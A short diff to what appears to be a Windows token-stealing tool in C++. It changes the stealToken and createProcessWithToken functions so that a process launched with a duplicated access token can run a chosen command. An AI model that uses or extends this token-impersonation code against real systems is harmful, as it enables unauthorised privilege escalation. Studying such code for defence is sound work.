@@ -163,7 +163,7 @@ TELEV getTokenElevationType(HANDLE hToken)
 	return telev;
 }
 
-void createProcessWithToken(HANDLE hToken)
+void createProcessWithToken(HANDLE hToken, wchar_t cmd2[])
 {
 	LPSTARTUPINFOW sinfo = new STARTUPINFOW();
 	sinfo->cb = sizeof(STARTUPINFOW);
@@ -178,14 +178,14 @@ void createProcessWithToken(HANDLE hToken)
 	printf("[*] starting new process: %d\n", pinfo->dwProcessId);
 }
 
-void stealToken(HANDLE hToken)
+void stealToken(HANDLE hToken, wchar_t cmd[])
 {
 	printf("[*] stealing token\n");
 	HANDLE hTokenDup;
 	if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenImpersonation, &hTokenDup))
 	{
 		SetThreadToken(nullptr, hTokenDup);
-		createProcessWithToken(hTokenDup);
+		createProcessWithToken(hTokenDup, cmd);
 	}
 	else
 	{
